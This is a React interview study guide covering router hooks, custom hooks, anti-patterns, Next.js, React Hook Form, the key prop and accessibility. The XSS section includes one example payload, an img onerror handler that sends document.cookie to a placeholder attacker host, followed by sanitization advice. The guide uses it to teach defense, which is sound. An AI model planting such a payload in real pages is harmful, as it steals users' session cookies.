# React — Missing Topics Part 3

> **Still missing after Parts 1 & 2:**
> React Router Advanced (useNavigate, useSearchParams, Protected Routes, Loaders) ·
> Custom Hook Implementations (useFetch, useLocalStorage, useDebounce) ·
> React Anti-Patterns · Next.js Basics · React Hook Form ·
> `key` Prop Deep Dive · `dangerouslySetInnerHTML` · Accessibility in React

---

## Table of Contents
1. [React Router v6 — Advanced Features](#1-react-router-v6--advanced-features)
2. [Common Custom Hook Implementations](#2-common-custom-hook-implementations)
3. [React Anti-Patterns — What NOT To Do](#3-react-anti-patterns--what-not-to-do)
4. [Next.js Basics](#4-nextjs-basics)
5. [React Hook Form](#5-react-hook-form)
6. [The `key` Prop — Deep Dive](#6-the-key-prop--deep-dive)
7. [dangerouslySetInnerHTML and XSS](#7-dangerouslysetinnerhtml-and-xss)
8. [Accessibility (a11y) in React](#8-accessibility-a11y-in-react)

---

## 1. React Router v6 — Advanced Features

### Interview Question
**"What React Router hooks do you know beyond useParams? Walk me through useNavigate, useSearchParams, and how you build protected routes."**

### Answer (Conversational)

Episode 7 covered `createBrowserRouter`, `useParams`, `Link`, and `Outlet`. Here's what wasn't covered.

---

#### useNavigate — Programmatic Navigation

`useNavigate` lets you navigate **in code** — not from a link click, but from inside logic (after a form submit, after login, on timeout, etc.).

```jsx
import { useNavigate } from "react-router-dom";

function LoginForm() {
  const navigate = useNavigate();

  async function handleSubmit(e) {
    e.preventDefault();
    const success = await loginUser(credentials);

    if (success) {
      navigate("/dashboard");          // go to /dashboard
      navigate("/dashboard", { replace: true }); // replace history (can't go back)
      navigate(-1);                     // go back (like browser back button)
      navigate(1);                      // go forward
    }
  }

  return <form onSubmit={handleSubmit}>...</form>;
}
```

**`replace: true`** — replaces the current entry in history instead of pushing a new one. Use this after login so the user can't click "back" to return to the login page.

---

#### useLocation — Reading Current URL Info

```jsx
import { useLocation } from "react-router-dom";

function CurrentPage() {
  const location = useLocation();

  console.log(location.pathname);  // "/restaurant/123"
  console.log(location.search);    // "?table=4"
  console.log(location.state);     // any state passed via navigate()
  console.log(location.hash);      // "#menu"

  return <p>You are at: {location.pathname}</p>;
}

// Passing state through navigation (no URL visible):
navigate("/checkout", { state: { cartItems, total } });

// Reading it on the other side:
const location = useLocation();
const { cartItems, total } = location.state;
```

---

#### useSearchParams — Working with Query Strings

Query strings are the `?key=value` part of a URL. `useSearchParams` reads and updates them — like `useState` but synced to the URL.

```jsx
import { useSearchParams } from "react-router-dom";

function ProductList() {
  const [searchParams, setSearchParams] = useSearchParams();

  // Read query params:
  const category = searchParams.get("category") ?? "all";
  const page = Number(searchParams.get("page") ?? 1);
  const sortBy = searchParams.get("sort") ?? "price";

  // Update query params (URL changes, shareable/bookmarkable!):
  function handleCategoryChange(newCategory) {
    setSearchParams({ category: newCategory, page: 1, sort: sortBy });
    // URL becomes: /products?category=shoes&page=1&sort=price
  }

  return (
    <div>
      <select value={category} onChange={e => handleCategoryChange(e.target.value)}>
        <option value="all">All</option>
        <option value="shoes">Shoes</option>
        <option value="shirts">Shirts</option>
      </select>
      <ProductGrid category={category} page={page} />
    </div>
  );
}
```

**Why query params over state?** They're in the URL — users can bookmark, share, and refresh the page and land on the exact same filtered view. State is lost on refresh.

---

#### Protected Routes — Authentication Guard

A protected route redirects unauthenticated users to the login page. The standard pattern wraps routes in a guard component:

```jsx
import { Navigate, Outlet } from "react-router-dom";

// The guard component:
function ProtectedRoute() {
  const { isLoggedIn } = useAuth(); // your auth hook/context

  if (!isLoggedIn) {
    // Redirect to login, preserving where they were trying to go:
    return <Navigate to="/login" replace />;
  }

  return <Outlet />; // render the child route if authenticated
}

// Router config:
const router = createBrowserRouter([
  { path: "/login", element: <Login /> },
  { path: "/", element: <Home /> },

  // All routes inside ProtectedRoute require authentication:
  {
    element: <ProtectedRoute />,  // the guard
    children: [
      { path: "/dashboard", element: <Dashboard /> },
      { path: "/profile", element: <Profile /> },
      { path: "/settings", element: <Settings /> },
    ],
  },
]);
```

---

#### Route Loaders (v6.4+) — Data Before Render

Loaders let you fetch data **before** a route renders — no more `useEffect` data fetching inside components for route-level data.

```jsx
// Define a loader function:
async function restaurantLoader({ params }) {
  const res = await fetch(`/api/restaurants/${params.resId}`);
  if (!res.ok) throw new Response("Not Found", { status: 404 });
  return res.json();
}

// Attach it to the route:
const router = createBrowserRouter([
  {
    path: "/restaurant/:resId",
    element: <RestaurantMenu />,
    loader: restaurantLoader,
    errorElement: <ErrorPage />,
  },
]);

// Use the data in the component:
import { useLoaderData } from "react-router-dom";

function RestaurantMenu() {
  const restaurant = useLoaderData(); // data is already fetched!
  return <h1>{restaurant.name}</h1>;
}
```

### Coding Questions

**Q1:** How do you redirect after logout?
```jsx
function LogoutButton() {
  const navigate = useNavigate();
  const { logout } = useAuth();

  async function handleLogout() {
    await logout();
    navigate("/login", { replace: true }); // replace: true so back button doesn't work
  }

  return <button onClick={handleLogout}>Logout</button>;
}
```

---

**Q2:** How do you preserve the intended URL when redirecting to login?
```jsx
// In ProtectedRoute — save current location:
function ProtectedRoute() {
  const { isLoggedIn } = useAuth();
  const location = useLocation();

  if (!isLoggedIn) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  return <Outlet />;
}

// In Login — redirect back after successful login:
function Login() {
  const navigate = useNavigate();
  const location = useLocation();
  const from = location.state?.from?.pathname ?? "/dashboard";

  async function handleLogin() {
    await loginUser(credentials);
    navigate(from, { replace: true }); // go where they wanted to go
  }
}
```

---

## 2. Common Custom Hook Implementations

### Interview Question
**"Implement useFetch, useLocalStorage, and useDebounce from scratch."**

### Answer (Conversational)

These three are the most commonly asked custom hook implementation questions in React interviews. Knowing them cold will impress any interviewer.

---

#### useFetch — Reusable Data Fetching Hook

```jsx
import { useState, useEffect } from "react";

function useFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    // Cleanup: if component unmounts or url changes before fetch completes,
    // don't set state on an unmounted component (memory leak prevention):
    let cancelled = false;

    setLoading(true);
    setError(null);

    fetch(url)
      .then(res => {
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        return res.json();
      })
      .then(data => {
        if (!cancelled) {
          setData(data);
          setLoading(false);
        }
      })
      .catch(err => {
        if (!cancelled) {
          setError(err.message);
          setLoading(false);
        }
      });

    return () => {
      cancelled = true; // cleanup — prevents setting state after unmount
    };
  }, [url]); // re-fetch when URL changes

  return { data, loading, error };
}

// Usage — dramatically simplified:
function UserProfile({ userId }) {
  const { data: user, loading, error } = useFetch(`/api/users/${userId}`);

  if (loading) return <p>Loading...</p>;
  if (error) return <p>Error: {error}</p>;
  return <h1>{user.name}</h1>;
}
```

---

#### useLocalStorage — Persistent State

Syncs state to localStorage so it survives page refresh:

```jsx
import { useState } from "react";

function useLocalStorage(key, initialValue) {
  // Lazy initializer — read from localStorage only on first render:
  const [storedValue, setStoredValue] = useState(() => {
    try {
      const item = window.localStorage.getItem(key);
      return item ? JSON.parse(item) : initialValue;
    } catch {
      return initialValue; // fallback if JSON.parse fails
    }
  });

  function setValue(value) {
    try {
      // Allow value to be a function (same API as useState):
      const valueToStore = value instanceof Function ? value(storedValue) : value;
      setStoredValue(valueToStore);
      window.localStorage.setItem(key, JSON.stringify(valueToStore));
    } catch (error) {
      console.error("useLocalStorage write error:", error);
    }
  }

  return [storedValue, setValue];
}

// Usage — exact same API as useState, but persists across refreshes:
function ThemeToggle() {
  const [theme, setTheme] = useLocalStorage("theme", "light");

  return (
    <button onClick={() => setTheme(t => t === "light" ? "dark" : "light")}>
      Current theme: {theme}
    </button>
  );
}
```

---

#### useDebounce — Delay a Value Update

Returns a debounced copy of a value — it only updates after the user has stopped changing it for a specified delay:

```jsx
import { useState, useEffect } from "react";

function useDebounce(value, delay = 500) {
  const [debouncedValue, setDebouncedValue] = useState(value);

  useEffect(() => {
    // Set a timer to update the debounced value after the delay:
    const timer = setTimeout(() => {
      setDebouncedValue(value);
    }, delay);

    // Cleanup: if value changes before the timer fires, cancel the old timer:
    return () => clearTimeout(timer);
  }, [value, delay]);

  return debouncedValue;
}

// Usage — search that only fires API call after user stops typing:
function SearchPage() {
  const [query, setQuery] = useState("");
  const debouncedQuery = useDebounce(query, 500); // 500ms delay

  // Only fires when debouncedQuery changes (500ms after user stops typing):
  useEffect(() => {
    if (debouncedQuery) {
      searchAPI(debouncedQuery);
    }
  }, [debouncedQuery]);

  return (
    <input
      value={query}
      onChange={e => setQuery(e.target.value)} // updates immediately
      placeholder="Search..."
    />
  );
}
```

---

#### Bonus: useOnlineStatus

```jsx
import { useState, useEffect } from "react";

function useOnlineStatus() {
  const [isOnline, setIsOnline] = useState(navigator.onLine);

  useEffect(() => {
    function setOnline() { setIsOnline(true); }
    function setOffline() { setIsOnline(false); }

    window.addEventListener("online", setOnline);
    window.addEventListener("offline", setOffline);

    return () => {
      window.removeEventListener("online", setOnline);
      window.removeEventListener("offline", setOffline);
    };
  }, []);

  return isOnline;
}

// Usage:
function App() {
  const isOnline = useOnlineStatus();
  return isOnline ? <Main /> : <OfflineBanner />;
}
```

#### Bonus: useWindowSize

```jsx
function useWindowSize() {
  const [size, setSize] = useState({
    width: window.innerWidth,
    height: window.innerHeight,
  });

  useEffect(() => {
    function handleResize() {
      setSize({ width: window.innerWidth, height: window.innerHeight });
    }
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  return size;
}
```

---

## 3. React Anti-Patterns — What NOT To Do

### Interview Question
**"What are the most common React anti-patterns? What mistakes do junior developers make?"**

### Answer (Conversational)

Interviewers love this question — it shows maturity and real-world experience. Here are the most common ones.

---

#### Anti-Pattern 1: Mutating State Directly

```jsx
// ❌ WRONG — mutating state directly:
function addItem() {
  items.push(newItem);     // mutating the array
  setItems(items);         // passing the SAME reference — React won't re-render!
}

// ✓ CORRECT — create new array:
function addItem() {
  setItems([...items, newItem]); // new array reference — React detects change
}

// ❌ WRONG — mutating an object in state:
function updateUser() {
  user.name = "Alice";    // mutating
  setUser(user);          // same reference — no re-render
}

// ✓ CORRECT:
function updateUser() {
  setUser({ ...user, name: "Alice" }); // new object
}
```

---

#### Anti-Pattern 2: Using Index as Key in Dynamic Lists

```jsx
// ❌ WRONG — index as key breaks React's reconciliation:
items.map((item, index) => <Item key={index} data={item} />);

// If you remove item at index 1, item at index 2 becomes index 1.
// React thinks it updated index 1's data — not that a component was removed.
// This causes bugs: wrong component animations, stale state, input values

// ✓ CORRECT — use a stable unique ID:
items.map(item => <Item key={item.id} data={item} />);
```

Use index as key ONLY when the list is **static** (never reordered/filtered/deleted) and items have no unique IDs.

---

#### Anti-Pattern 3: Calling Hooks Conditionally

```jsx
// ❌ WRONG — conditional hook (violates Rules of Hooks):
function MyComponent({ showData }) {
  if (showData) {
    const [data, setData] = useState(null); // ERROR! hooks can't be inside if
  }
  // ...
}

// ❌ WRONG — hook inside loop:
function MyList({ items }) {
  return items.map(item => {
    const [selected, setSelected] = useState(false); // ERROR!
    return <div onClick={() => setSelected(true)}>{item.name}</div>;
  });
}

// ✓ CORRECT — always call hooks at the top level:
function MyComponent({ showData }) {
  const [data, setData] = useState(null); // always called
  if (!showData) return null;             // conditional return is fine
  return <div>{data}</div>;
}
```

**Why:** React tracks hooks by their call order. If hooks are called conditionally, the order can change between renders → React loses track of which state belongs to which hook.

---

#### Anti-Pattern 4: Creating Components Inside Components

```jsx
// ❌ WRONG — Inner is recreated on every render:
function Parent() {
  // This creates a brand new component definition on every Parent render!
  function Inner() {
    return <p>Hello</p>;
  }

  return <Inner />; // React sees a new component type every render → remounts!
}

// ✓ CORRECT — define outside:
function Inner() {
  return <p>Hello</p>;
}

function Parent() {
  return <Inner />;
}
```

When a component is defined inside another component, React sees a new component type on every render and **unmounts + remounts** the inner component instead of updating it. This destroys state and causes terrible performance.

---

#### Anti-Pattern 5: Overusing useEffect

```jsx
// ❌ WRONG — deriving state in useEffect:
function CartSummary({ items }) {
  const [total, setTotal] = useState(0);

  useEffect(() => {
    setTotal(items.reduce((sum, item) => sum + item.price, 0));
  }, [items]); // runs after render, causes extra render

  return <p>Total: {total}</p>;
}

// ✓ CORRECT — compute during render (no useEffect needed):
function CartSummary({ items }) {
  const total = items.reduce((sum, item) => sum + item.price, 0); // computed inline
  return <p>Total: {total}</p>;
}
```

**Rule:** If you're using `useEffect` to set state that could be computed from existing state/props, don't. Compute it during render instead. `useEffect` is for **synchronizing with external systems** (APIs, DOM, timers), not for derived state.

---

#### Anti-Pattern 6: Prop Drilling Excessively

```jsx
// ❌ WRONG — threading props 4 levels deep just to reach GrandChild:
<App user={user}>
  <Layout user={user}>
    <Sidebar user={user}>
      <UserAvatar user={user} /> {/* only this needs 'user'! */}
    </Sidebar>
  </Layout>
</App>

// ✓ CORRECT — use Context for widely-needed data:
const UserContext = createContext(null);

<UserContext.Provider value={user}>
  <Layout>          {/* doesn't receive user prop */}
    <Sidebar>       {/* doesn't receive user prop */}
      <UserAvatar /> {/* reads from context directly */}
    </Sidebar>
  </Layout>
</UserContext.Provider>
```

---

#### Anti-Pattern 7: Not Cleaning Up Effects

```jsx
// ❌ WRONG — memory leak: event listener never removed:
useEffect(() => {
  window.addEventListener("resize", handleResize);
  // forgot to return cleanup!
}, []);

// ❌ WRONG — subscription never cancelled:
useEffect(() => {
  const subscription = dataStream.subscribe(handleData);
  // forgot cleanup!
}, []);

// ✓ CORRECT — always clean up:
useEffect(() => {
  window.addEventListener("resize", handleResize);
  return () => window.removeEventListener("resize", handleResize); // cleanup
}, []);

useEffect(() => {
  const subscription = dataStream.subscribe(handleData);
  return () => subscription.unsubscribe(); // cleanup
}, []);
```

---

#### Anti-Pattern 8: Unnecessary useState for Derived Values

```jsx
// ❌ WRONG — fullName is derived from firstName + lastName, no need for state:
const [firstName, setFirstName] = useState("");
const [lastName, setLastName] = useState("");
const [fullName, setFullName] = useState(""); // redundant state!

useEffect(() => {
  setFullName(`${firstName} ${lastName}`);
}, [firstName, lastName]);

// ✓ CORRECT — just compute it:
const [firstName, setFirstName] = useState("");
const [lastName, setLastName] = useState("");
const fullName = `${firstName} ${lastName}`; // derived during render
```

---

#### Anti-Pattern 9: Large Monolithic Components

```jsx
// ❌ WRONG — one massive 500-line component:
function App() {
  // 10 useState hooks
  // 5 useEffect hooks
  // fetch logic
  // filtering logic
  // JSX with 15 nested levels
  // ...
}

// ✓ CORRECT — split by responsibility:
function App() {
  return (
    <Layout>
      <Header />
      <SearchBar />
      <RestaurantList />
      <Footer />
    </Layout>
  );
}
// Each component has ONE clear job
```

---

## 4. Next.js Basics

### Interview Question
**"What is Next.js? What rendering strategies does it support? What is the App Router?"**

### Answer (Conversational)

**Next.js** is a React **framework** built on top of React that adds:
- File-based routing (no react-router needed)
- Server-side rendering (SSR)
- Static site generation (SSG)
- Incremental static regeneration (ISR)
- API routes
- Image optimization
- Built-in TypeScript support

It's the most popular React framework — many companies use Next.js instead of plain Create React App or Vite.

---

#### Two Routers: Pages Router vs App Router

Next.js has two routing systems:

| | **Pages Router** (older) | **App Router** (Next.js 13+, default) |
|---|---|---|
| Folder | `pages/` | `app/` |
| Data fetching | `getServerSideProps`, `getStaticProps` | `async` Server Components, `fetch()` |
| Layouts | `_app.js` | `layout.tsx` files |
| Loading states | Manual | `loading.tsx` files |
| Error handling | Manual | `error.tsx` files |
| React version | React 17/18 | React 18 (Server Components) |

---

#### Pages Router — File-Based Routing

```
pages/
  index.tsx          → /
  about.tsx          → /about
  blog/
    index.tsx        → /blog
    [slug].tsx       → /blog/my-post (dynamic route)
  api/
    users.ts         → /api/users (API route)
```

```tsx
// pages/blog/[slug].tsx — dynamic route
import { GetServerSideProps } from "next";

// getServerSideProps — runs on server for EVERY request (SSR):
export async function getServerSideProps({ params }) {
  const post = await fetchPost(params.slug);
  return { props: { post } }; // passed as props to the component
}

// getStaticProps — runs at BUILD time (SSG — fastest):
export async function getStaticProps({ params }) {
  const post = await fetchPost(params.slug);
  return {
    props: { post },
    revalidate: 60, // ISR: regenerate page every 60 seconds
  };
}

// getStaticPaths — which dynamic paths to pre-build:
export async function getStaticPaths() {
  const slugs = await fetchAllSlugs();
  return {
    paths: slugs.map(slug => ({ params: { slug } })),
    fallback: "blocking", // pages not pre-built are SSR on demand
  };
}

export default function BlogPost({ post }) {
  return <article>{post.content}</article>;
}
```

---

#### App Router — Server Components by Default

In the App Router, every component is a **Server Component** by default (runs on server, no JS sent to client):

```
app/
  layout.tsx           → root layout (wraps all pages)
  page.tsx             → /
  about/
    page.tsx           → /about
  restaurant/
    [id]/
      page.tsx         → /restaurant/123
      loading.tsx      → shown while page.tsx is loading
      error.tsx        → shown if page.tsx throws
  api/
    users/
      route.ts         → /api/users (API route)
```

```tsx
// app/restaurant/[id]/page.tsx — Server Component (async by default!)
async function RestaurantPage({ params }: { params: { id: string } }) {
  // Direct data fetching — no useEffect, no useState:
  const restaurant = await fetch(`https://api.example.com/restaurants/${params.id}`)
    .then(r => r.json());

  return (
    <div>
      <h1>{restaurant.name}</h1>
      {/* Client component for interactivity: */}
      <AddToCartButton restaurantId={params.id} />
    </div>
  );
}
export default RestaurantPage;
```

```tsx
// app/restaurant/[id]/AddToCartButton.tsx — Client Component
"use client"; // MUST declare — opts into client-side rendering

import { useState } from "react";

export function AddToCartButton({ restaurantId }: { restaurantId: string }) {
  const [added, setAdded] = useState(false);
  return (
    <button onClick={() => setAdded(true)}>
      {added ? "Added!" : "Add to Cart"}
    </button>
  );
}
```

---

#### Rendering Strategies

| Strategy | When renders | Use case |
|---|---|---|
| **SSG** (Static Site Generation) | Build time | Blog, marketing pages, docs |
| **ISR** (Incremental Static Regeneration) | Build + re-validates periodically | Product pages, news sites |
| **SSR** (Server-Side Rendering) | Every request | Personalized pages, real-time data |
| **CSR** (Client-Side Rendering) | In browser | Dashboards after login, admin panels |

---

#### Next.js useRouter vs React Router

```tsx
// Next.js App Router navigation:
import { useRouter } from "next/navigation"; // NOT 'next/router'!

function MyComponent() {
  const router = useRouter();
  router.push("/dashboard");
  router.replace("/login");
  router.back();
}

// Reading current path:
import { usePathname, useSearchParams } from "next/navigation";

function MyComponent() {
  const pathname = usePathname();       // "/restaurant/123"
  const searchParams = useSearchParams(); // URLSearchParams object
  const id = searchParams.get("id");
}
```

---

## 5. React Hook Form

### Interview Question
**"What is React Hook Form? Why is it better than managing form state manually?"**

### Answer (Conversational)

**React Hook Form (RHF)** is the most popular form library for React. Its key advantage: it uses **uncontrolled inputs with refs** instead of controlling every input with `useState`. This means:
- **Fewer re-renders** — typing in a field doesn't re-render the whole form
- **Less code** — validation, errors, and submission built-in
- **Easy integration** with UI libraries (MUI, Chakra, custom components)

```bash
npm install react-hook-form
```

---

#### Basic Usage

```jsx
import { useForm } from "react-hook-form";

function SignupForm() {
  const {
    register,      // connects input to RHF
    handleSubmit,  // wraps your submit handler
    formState: { errors, isSubmitting }, // validation errors and state
    watch,         // watch a field value
    reset,         // reset form to initial values
  } = useForm();

  async function onSubmit(data) {
    // data = { email: "...", password: "..." } — already validated!
    await createUser(data);
    reset(); // clear form after success
  }

  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <input
        {...register("email", {
          required: "Email is required",
          pattern: {
            value: /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i,
            message: "Invalid email address",
          },
        })}
        placeholder="Email"
      />
      {errors.email && <p>{errors.email.message}</p>}

      <input
        type="password"
        {...register("password", {
          required: "Password is required",
          minLength: { value: 8, message: "Min 8 characters" },
        })}
        placeholder="Password"
      />
      {errors.password && <p>{errors.password.message}</p>}

      <button type="submit" disabled={isSubmitting}>
        {isSubmitting ? "Signing up..." : "Sign Up"}
      </button>
    </form>
  );
}
```

---

#### With Validation Library (Zod)

For complex validation, RHF pairs perfectly with **Zod** (TypeScript-first schema validation):

```bash
npm install zod @hookform/resolvers
```

```tsx
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";

const schema = z.object({
  email: z.string().email("Invalid email"),
  password: z.string().min(8, "Min 8 characters"),
  age: z.number().min(18, "Must be 18+"),
});

type FormData = z.infer<typeof schema>; // TypeScript type from schema

function SignupForm() {
  const { register, handleSubmit, formState: { errors } } = useForm<FormData>({
    resolver: zodResolver(schema),
  });

  return (
    <form onSubmit={handleSubmit(data => console.log(data))}>
      <input {...register("email")} />
      {errors.email && <p>{errors.email.message}</p>}
      {/* ... */}
    </form>
  );
}
```

---

#### Controller — For UI Library Inputs

When using a component that doesn't expose a native input (like a custom dropdown or date picker), use `Controller`:

```jsx
import { useForm, Controller } from "react-hook-form";
import DatePicker from "react-datepicker"; // third-party component

function BookingForm() {
  const { control, handleSubmit } = useForm();

  return (
    <form onSubmit={handleSubmit(console.log)}>
      <Controller
        name="bookingDate"
        control={control}
        rules={{ required: "Date is required" }}
        render={({ field }) => (
          <DatePicker
            selected={field.value}
            onChange={field.onChange} // connects to RHF
          />
        )}
      />
    </form>
  );
}
```

---

## 6. The `key` Prop — Deep Dive

### Interview Question
**"Explain the `key` prop beyond list rendering. How can you use it to force a component to reset?"**

### Answer (Conversational)

The key prop is covered in Episode 4 for list rendering, but there's a powerful advanced use case that most developers don't know: **using `key` to force a component to unmount and remount**.

---

#### How key Works Internally

When React reconciles the tree, it uses `key` to match components between renders. If the key **changes**, React treats it as a **completely different component** — it unmounts the old one and mounts a fresh one. This resets all state, refs, and effects.

---

#### Advanced Use: Resetting a Component's State

```jsx
// Problem: Form keeps its old values when 'userId' changes
function UserEditor({ userId }) {
  const [name, setName] = useState("");

  useEffect(() => {
    fetchUser(userId).then(user => setName(user.name));
  }, [userId]); // This works but causes a flash of old data first

  return <input value={name} onChange={e => setName(e.target.value)} />;
}

// Solution: Use key to reset ALL state instantly when userId changes:
function Parent() {
  const [userId, setUserId] = useState(1);

  return (
    <UserEditor
      key={userId}  // ← When userId changes, UserEditor remounts fresh!
      userId={userId}
    />
  );
}

function UserEditor({ userId }) {
  const [name, setName] = useState(""); // always starts fresh!
  // ...
}
```

By changing the `key`, you get a **brand new component instance** — no stale state, no flash of old data.

---

#### Use Case: Reset Form After Submission

```jsx
function AddItemForm({ onAdd }) {
  const [text, setText] = useState("");

  function handleSubmit(e) {
    e.preventDefault();
    onAdd(text);
    setText(""); // manual reset — gets tedious for many fields
  }

  return <form onSubmit={handleSubmit}><input value={text} onChange={...} /></form>;
}

// Better: control reset with key
function Parent() {
  const [formKey, setFormKey] = useState(0);

  function handleAdd(item) {
    addItem(item);
    setFormKey(k => k + 1); // increment key → form remounts fresh!
  }

  return <AddItemForm key={formKey} onAdd={handleAdd} />;
}
```

---

#### Use Case: Force Re-fetch on Route Change

```jsx
// If you navigate from /user/1 to /user/2 but the component is the same,
// React reuses it — state isn't reset automatically.
// Adding key forces a clean remount:
<Route
  path="/user/:id"
  element={<UserProfile key={params.id} />}  // remounts per user
/>
```

---

#### The Rule

> If you want a component to **reset** when a prop changes → give it that prop as its `key`.
> If you want a component to **update** when a prop changes → handle it with `useEffect`.

---

## 7. dangerouslySetInnerHTML and XSS

### Interview Question
**"What is `dangerouslySetInnerHTML`? What security risk does it introduce?"**

### Answer (Conversational)

`dangerouslySetInnerHTML` is React's way of setting raw HTML inside a component. The name is intentionally scary — it's a warning that you're doing something potentially dangerous.

```jsx
// Renders raw HTML string as actual DOM:
function BlogPost({ content }) {
  return (
    <article
      dangerouslySetInnerHTML={{ __html: content }}
    />
  );
}

// content = "<h1>Title</h1><p>Paragraph</p>"
// → Renders actual h1 and p elements in the DOM
```

Note the double curly braces — the outer `{}` is JSX expression, the inner `{}` is the object with `__html` key. The awkward `__html` key is intentional — it forces you to type more to make you think twice.

---

#### The XSS Risk

If `content` contains malicious script tags from user input, they'll execute:

```jsx
// User submits this as their "bio":
const maliciousContent = `<img src="x" onerror="document.location='https://evil.com?c='+document.cookie">`;

// Rendering it unmodified:
<div dangerouslySetInnerHTML={{ __html: maliciousContent }} />
// → The img fails to load, onerror fires, and the attacker steals cookies!
```

This is a **Cross-Site Scripting (XSS)** attack.

---

#### Safe Usage — Always Sanitize First

Never render user-controlled content with `dangerouslySetInnerHTML` without sanitizing it first. Use **DOMPurify**:

```bash
npm install dompurify
```

```jsx
import DOMPurify from "dompurify";

function BlogPost({ userContent }) {
  // Sanitize BEFORE rendering — removes dangerous scripts:
  const cleanHTML = DOMPurify.sanitize(userContent);

  return <article dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
```

DOMPurify strips out `<script>` tags, `onerror` attributes, `javascript:` URLs, and other attack vectors while keeping safe HTML like `<b>`, `<i>`, `<p>`, `<a>`.

---

#### When Is It Legitimate to Use?

- **CMS-rendered content** — blog post HTML from a trusted CMS (still sanitize!)
- **Markdown rendered to HTML** — after running through a markdown parser like `marked`
- **Trusted server-controlled HTML** — when YOUR server generates it, not users

```jsx
import { marked } from "marked"; // markdown to HTML converter
import DOMPurify from "dompurify";

function MarkdownRenderer({ markdown }) {
  const rawHTML = marked(markdown);             // markdown → HTML
  const cleanHTML = DOMPurify.sanitize(rawHTML); // sanitize just in case

  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
```

**Note:** React's JSX automatically escapes strings — `{userInput}` is safe. It's only `dangerouslySetInnerHTML` that bypasses this protection.

---

## 8. Accessibility (a11y) in React

### Interview Question
**"How do you make React applications accessible? What are the key practices?"**

### Answer (Conversational)

Accessibility (a11y) means building apps that work for people using assistive technologies — screen readers, keyboard-only navigation, etc. It's increasingly important in interviews, especially for senior roles.

---

#### 1. Semantic HTML First

The most impactful thing you can do is use the right HTML elements:

```jsx
// ❌ Wrong — divs for everything:
<div onClick={handleClick}>Submit</div>
<div class="header">...</div>
<div class="nav">...</div>

// ✓ Correct — semantic elements:
<button onClick={handleClick}>Submit</button>  {/* focusable, keyboard accessible */}
<header>...</header>
<nav>...</nav>
<main>...</main>
<article>...</article>
<footer>...</footer>
```

---

#### 2. ARIA Attributes — When Semantics Aren't Enough

**ARIA (Accessible Rich Internet Applications)** attributes fill gaps when HTML semantics don't cover a use case:

```jsx
// aria-label — label for elements without visible text:
<button aria-label="Close dialog">✕</button>

// aria-describedby — links element to its description:
<input
  id="email"
  aria-describedby="email-hint"
  aria-invalid={!!error}  // tells screen reader input has an error
/>
<p id="email-hint">We'll never share your email.</p>
{error && <p role="alert">{error}</p>}  {/* role="alert" announces to screen readers */}

// aria-hidden — hide decorative elements from screen readers:
<span aria-hidden="true">❤️</span>  {/* icon is decorative, label conveys meaning */}
<button>
  <span aria-hidden="true">❤️</span>
  Like this post
</button>

// aria-expanded — accordion/dropdown state:
<button
  aria-expanded={isOpen}
  aria-controls="menu-content"
  onClick={() => setIsOpen(!isOpen)}
>
  Menu
</button>
<div id="menu-content" hidden={!isOpen}>
  {/* menu items */}
</div>

// aria-live — announce dynamic updates to screen readers:
<div aria-live="polite">
  {statusMessage}  {/* screen reader announces when this changes */}
</div>
```

---

#### 3. Focus Management

When you show a modal or change the view, move focus to the right place:

```jsx
function Modal({ isOpen, onClose }) {
  const closeButtonRef = useRef(null);

  useEffect(() => {
    if (isOpen) {
      closeButtonRef.current?.focus(); // focus the close button when modal opens
    }
  }, [isOpen]);

  if (!isOpen) return null;

  return (
    <div role="dialog" aria-modal="true" aria-label="Settings">
      <button ref={closeButtonRef} onClick={onClose}>
        Close
      </button>
      {/* modal content */}
    </div>
  );
}
```

---

#### 4. Keyboard Navigation

Every interactive element must be keyboard accessible:

```jsx
// ❌ Wrong — div with onClick isn't keyboard accessible:
<div onClick={handleSelect} className="option">
  Option 1
</div>

// ✓ Correct — button is focusable and responds to Enter/Space:
<button onClick={handleSelect} className="option">
  Option 1
</button>

// If you MUST use a div (e.g., for styling):
<div
  role="button"
  tabIndex={0}                            // makes it focusable
  onClick={handleSelect}
  onKeyDown={e => {
    if (e.key === "Enter" || e.key === " ") {
      e.preventDefault();
      handleSelect();
    }
  }}
>
  Option 1
</div>
```

---

#### 5. Form Accessibility

```jsx
// ❌ Wrong — input with no label:
<input type="text" placeholder="Email" />

// ✓ Correct — explicit label:
<label htmlFor="email">Email address</label>
<input id="email" type="email" />

// ✓ Also correct — implicit label:
<label>
  Email address
  <input type="email" />
</label>

// Required field:
<label htmlFor="name">
  Name <span aria-hidden="true">*</span>
</label>
<input id="name" required aria-required="true" />
```

---

#### 6. Color and Contrast

Don't rely on color alone to convey meaning — screen reader users and colorblind users miss it:

```jsx
// ❌ Wrong — only color indicates error:
<input style={{ border: "2px solid red" }} />

// ✓ Correct — color + text + icon:
<input
  style={{ border: "2px solid red" }}
  aria-invalid="true"
/>
<p style={{ color: "red" }}>⚠️ This field is required.</p>
```

---

#### Quick a11y Checklist for Interviews

| Area | What to do |
|---|---|
| Semantic HTML | Use `<button>`, `<nav>`, `<main>`, `<header>`, etc. |
| Images | Always have `alt` text (`alt=""` for decorative) |
| Form inputs | Every input has a `<label>` with `htmlFor` |
| Errors | Use `role="alert"` or `aria-live="polite"` |
| Modals | `role="dialog"`, `aria-modal`, focus the first element |
| Interactive divs | Add `role="button"` + `tabIndex={0}` + keyboard handler |
| Color | Never use color alone to convey meaning |
| Skip links | Add "Skip to content" link for keyboard users |

---

## Final Coverage Map — All React Notes Files

| File | Topics |
|---|---|
| **Episodes 1–13** | React basics, JSX, props, useState, useEffect, useContext, useMemo, useCallback, useRef, custom hooks, React Router (basic), Redux Toolkit, lazy/Suspense, class components, Tailwind, HOC, Context, Virtual DOM, Fiber |
| **File 14** | useReducer, useLayoutEffect, useId, useTransition, useDeferredValue, forwardRef, useImperativeHandle, React.memo, Error Boundaries, Portals, Render Props, Compound Components |
